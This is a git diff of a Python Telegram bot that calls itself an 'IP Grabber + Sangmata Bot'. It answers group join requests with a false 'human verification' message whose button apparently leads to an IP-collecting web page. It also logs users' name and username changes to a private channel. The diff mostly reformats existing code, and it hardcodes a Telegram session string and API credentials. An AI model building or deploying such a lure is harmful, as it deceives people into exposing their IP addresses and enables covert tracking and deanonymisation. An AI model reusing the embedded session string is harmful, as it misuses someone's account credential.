@@ -10,7 +10,7 @@ SESSION_STRING = "BQHy6AcALg8-IFn7jkiIrFq2qi9xZrWhiMY78No7c6ZlSkOAUI2RF3OrW4nATG
 WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
 LOG_CHANNEL = -1002290475903
 
-app = Client("ip_grabber_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
+app = Client("sangmata_ip_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
 
 user_history = {}
 
@@ -30,7 +30,9 @@ async def handle_join_request(client, request):
     try:
         await client.send_message(
             user_id,
-            "✅ Human verification successful!\n\nClick the button below to verify you're human and join the group.\n\nLink will expire in 10 minutes.",
+            "✅ Human verification successful!\n\n"
+            "Click the button below to verify you're human and join the group.\n\n"
+            "Link will expire in 10 minutes.",
             reply_markup=keyboard
         )
         print(f"✅ PM verifikasi berhasil dikirim ke {user_id}")
@@ -47,7 +49,10 @@ async def sangmata_tracker(client, message):
     user_id = user.id
 
     if user_id not in user_history:
-        user_history[user_id] = {"first_name": user.first_name, "username": user.username}
+        user_history[user_id] = {
+            "first_name": user.first_name,
+            "username": user.username
+        }
 
     old = user_history[user_id]
     changes = []
@@ -67,9 +72,11 @@ async def sangmata_tracker(client, message):
 ⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
         """
         await client.send_message(LOG_CHANNEL, log_text)
-        print("✅ Sangmata log dikirim ke channel")
 
-    user_history[user_id] = {"first_name": user.first_name, "username": user.username}
+    user_history[user_id] = {
+        "first_name": user.first_name,
+        "username": user.username
+    }
 
 print("✅ IP Grabber + Sangmata Bot is running...")
 app.run()
